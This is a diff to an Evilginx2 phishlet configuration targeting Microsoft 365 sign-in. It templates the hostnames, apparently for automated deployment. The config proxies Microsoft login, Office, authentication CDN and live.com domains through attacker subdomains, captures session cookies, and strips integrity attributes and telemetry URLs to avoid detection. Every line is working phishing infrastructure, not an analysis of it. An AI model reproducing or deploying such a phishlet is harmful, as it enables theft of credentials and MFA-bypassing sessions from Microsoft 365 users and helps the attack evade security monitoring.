@@ -3,14 +3,14 @@ name: "Microsoft 365 Enterprise"
 min_ver: '3.2.0'
 redirect_url: 'https://office.com'
 proxy_hosts:
-  - {phish_sub: 'vm.evilginx2.o365.login_hostname', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'vm.evilginx2.o365.www_hostname', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
-  - {phish_sub: 'vm.evilginx2.o365.aadcdn_hostname', orig_sub: 'aadcdn', domain: 'msftauth.net', session: true, is_landing: false}
-  - {phish_sub: 'vm.evilginx2.o365.aadcdn2_hostname', orig_sub: 'aadcdn', domain: 'msauth.net', session: true, is_landing: false}
-  - {phish_sub: 'vm.evilginx2.o365.logincdn_hostname', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
-  - {phish_sub: 'vm.evilginx2.o365.sso_hostname', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
-  - {phish_sub: 'vm.evilginx2.o365.m365_hostname', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false}
-  - {phish_sub: 'vm.evilginx2.o365.events_hostname', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false}
+  - {phish_sub: '{{ vm.evilginx2.o365.login_hostname }}', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: '{{ vm.evilginx2.o365.www_hostname }}', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: '{{ vm.evilginx2.o365.aadcdn_hostname }}', orig_sub: 'aadcdn', domain: 'msftauth.net', session: true, is_landing: false}
+  - {phish_sub: '{{ vm.evilginx2.o365.aadcdn2_hostname }}', orig_sub: 'aadcdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: '{{ vm.evilginx2.o365.logincdn_hostname }}', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: '{{ vm.evilginx2.o365.sso_hostname }}', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: '{{ vm.evilginx2.o365.m365_hostname }}', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false}
+  - {phish_sub: '{{ vm.evilginx2.o365.events_hostname }}', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false}
 sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
